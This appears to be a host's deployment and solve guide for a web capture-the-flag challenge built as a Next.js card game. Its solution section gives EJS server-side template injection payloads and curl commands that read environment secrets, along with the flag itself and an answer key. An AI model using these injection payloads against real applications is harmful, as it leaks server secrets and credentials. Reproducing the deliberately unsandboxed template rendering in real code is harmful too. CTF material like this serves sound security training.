# 🚀 Upload Guide - Trump of Spades CTF Challenge

This guide covers how to deploy the **Trump of Spades** CTF challenge to Vercel, configure environment variables, and solve the challenge.

---

## 📋 Prerequisites

- **Node.js** 18+ installed locally
- **Vercel CLI** installed (`npm i -g vercel`) or a Vercel account
- **Git** repository (optional, for automatic deployments)

---

## 🏗️ Local Setup

### 1. Install Dependencies

```bash
npm install
```

### 2. Local Development

```bash
npm run dev
```

The app will be available at `http://localhost:3000`.

### 3. Build Locally (Optional)

```bash
npm run build
```

---

## ☁️ Deploy to Vercel

### Option A: Vercel CLI (Recommended for CTF)

```bash
# Login to Vercel (first time only)
vercel login

# Deploy to preview
vercel

# Deploy to production
vercel --prod
```

### Option B: Git Integration (Auto-Deploy)

1. Push code to GitHub/GitLab/Bitbucket
2. Import project in [Vercel Dashboard](https://vercel.com/dashboard)
3. Configure build settings:
   - **Framework Preset**: Next.js
   - **Build Command**: `npm run build`
   - **Output Directory**: `.next`

---

## 🔐 Environment Variables

Configure these in the **Vercel Dashboard** → Project Settings → Environment Variables:

| Variable | Value | Description |
|----------|-------|-------------|
| `FLAG` | `STN_AI{R34CT3D_T0_SH3LL}` | The CTF flag players must capture |
| `NODE_ENV` | `production` | Runtime environment |

### Setting via CLI

```bash
vercel env add FLAG
# Enter value: STN_AI{R34CT3D_T0_SH3LL}

vercel env add NODE_ENV production
```

### Important Notes

- The `FLAG` variable is **critical** - without it, the CTF is unsolvable
- Do NOT expose `FLAG` in `next.config.js` or client-side code
- The vulnerability chain intentionally leaks it via SSTI

---

## 🎯 CTF Solve Guide

### Challenge Overview

**Difficulty**: Medium  
**Category**: Web / SSTI / Source Analysis  
**Flag**: `STN_AI{R34CT3D_T0_SH3LL}`

The challenge is a legitimate-looking card game with a hidden vulnerability chain leading from frontend analysis to environment variable exfiltration.

---

### 🔍 Step-by-Step Solution

#### Step 1: Initial Reconnaissance

1. Open the deployed application in a browser
2. Play around with the card game features (lobby, replays)
3. Open **Browser DevTools** → **Network Tab**
4. Reload the page and look for `.map` files in network requests

**What to look for**:
```
GET /_next/static/chunks/main-[hash].js.map
GET /_next/static/chunks/pages/index-[hash].js.map
```

#### Step 2: Source Map Analysis

1. Download the main JS bundle source map
2. Search for hidden components or API endpoints:

```bash
# Using curl or browser
curl https://your-app.vercel.app/_next/static/chunks/main-[hash].js.map | grep -i "admin\|replay\|api"
```

**Key findings**:
- Hidden component: `AdminReplayDebugger`
- API endpoints:
  - `/api/replay/import`
  - `/api/admin/debug`

#### Step 3: Discover the Replay Feature

1. Navigate to the **Replay Viewer** in the UI
2. Try importing a replay JSON
3. Intercept the request to `/api/replay/import`

**Sample valid replay JSON**:
```json
{
  "players": ["Alice", "Bob"],
  "moves": [],
  "metadata": {
    "template": "Hello <%= players[0] %>"
  }
}
```

#### Step 4: SSTI Injection (The Exploit)

The server uses **EJS** template rendering without sandboxing. The `metadata.template` field is passed directly to `ejs.render()`.

**Payload to extract the flag**:
```json
{
  "players": ["test"],
  "moves": [],
  "metadata": {
    "template": "<%= global.process.env.FLAG %>"
  }
}
```

**Alternative payloads**:
```json
{
  "metadata": {
    "template": "<%= process.env.FLAG %>"
  }
}
```

```json
{
  "metadata": {
    "template": "<%= this.process.env.FLAG %>"
  }
}
```

#### Step 5: Execute the Attack

Using `curl`:
```bash
curl -X POST https://your-app.vercel.app/api/replay/import \
  -H "Content-Type: application/json" \
  -d '{
    "players": ["hacker"],
    "moves": [],
    "metadata": {
      "template": "<%= global.process.env.FLAG %>"
    }
  }'
```

**Expected response**:
```json
{
  "gameId": "game_1234567890",
  "players": ["hacker"],
  "moveCount": 0,
  "result": "STN_AI{R34CT3D_T0_SH3LL}",
  "metadata": {
    "template": "<%= global.process.env.FLAG %>"
  }
}
```

---

### 🛠️ Alternative: Admin Debug Endpoint

The hidden `/api/admin/debug` endpoint can also reveal information:

```bash
# Check endpoint info
curl https://your-app.vercel.app/api/admin/debug

# Try environment access
curl -X POST https://your-app.vercel.app/api/admin/debug \
  -H "Content-Type: application/json" \
  -d '{"command": "env"}'
```

**Note**: The `env` command may return partial results depending on sandboxing.

---

## 🧩 Vulnerability Chain Summary

| Step | Vulnerability | Discovery Method |
|------|--------------|------------------|
| 1 | Source maps exposed | Network tab / `.map` files |
| 2 | Hidden admin component | Source map analysis |
| 3 | Unsandboxed EJS rendering | Code review of `/api/replay/import` |
| 4 | Environment variable leak | SSTI payload execution |

---

## 🎓 Hints for Players

If participants get stuck, provide these progressive hints:

### Hint 1
> The production build includes source maps. Check the network tab for `.map` files or look at the main JS bundle for source references.

### Hint 2
> There's a "Trump Analyzer" component hidden in the bundle. Look for admin API endpoints in the JavaScript.

### Hint 3
> The replay system accepts a `metadata.template` field. Try injecting template syntax to see what happens.

### Hint 4
> In the EJS template, you can access process globals. Try `<%= process.env.FLAG %>` or equivalent to read the flag.

---

## ⚠️ Security Warnings

This application contains **intentional vulnerabilities** for CTF purposes:

- **DO NOT** deploy to production environments
- **DO NOT** expose real secrets or credentials
- **DO NOT** use this code as a reference for secure applications
- **ISOLATE** the deployment from sensitive infrastructure

---

## 🐛 Troubleshooting

### Build Errors

```bash
# Clear cache and rebuild
rm -rf .next node_modules
npm install
npm run build
```

### TypeScript Warnings

These are expected and do not prevent building:
```
- Type 'any' used implicitly
- Missing type definitions
```

### Vercel Deployment Issues

| Issue | Solution |
|-------|----------|
| Build fails | Check Node.js version (18+ required) |
| API routes 404 | Ensure `app/api/` directory structure is correct |
| Environment variables not set | Verify in Vercel dashboard, redeploy |
| Source maps not loading | Check `productionBrowserSourceMaps: true` in `next.config.js` |

---

## 📁 Project Structure

```
/app
├── page.tsx                    # Main game lobby
├── layout.tsx                  # Root layout
├── globals.css                 # Card game styling
├── components/
│   ├── GameLobby.tsx           # Create/join games
│   ├── CardTable.tsx           # Active card table
│   ├── ReplayViewer.tsx        # Replay import feature
│   ├── AdminReplayDebugger.tsx # Hidden admin component
│   └── ScoreBoard.tsx          # Player rankings
├── api/
│   ├── replay/
│   │   └── import.ts           # VULNERABLE: SSTI endpoint
│   └── admin/
│       └── debug.ts            # Hidden debug API
├── stores/
│   └── gameStore.ts            # Zustand state
└── lib/
    └── gameLogic.ts            # Card game logic
```

---

## ✅ Verification Checklist

Before hosting the CTF, verify:

- [ ] `npm run build` succeeds locally
- [ ] `vercel --prod` deploys successfully
- [ ] `FLAG` environment variable is set in Vercel dashboard
- [ ] Application loads and shows card game UI
- [ ] Source maps are accessible (check Network tab)
- [ ] SSTI payload successfully returns the flag
- [ ] Admin debug endpoint responds to requests

---

## 🎉 Success!

If everything is configured correctly, players will be able to:
1. Discover source maps in the browser
2. Find hidden API endpoints via source analysis
3. Exploit the SSTI vulnerability in the replay import feature
4. Extract the flag: `STN_AI{R34CT3D_T0_SH3LL}`

**Good luck and happy hacking!** 🎴
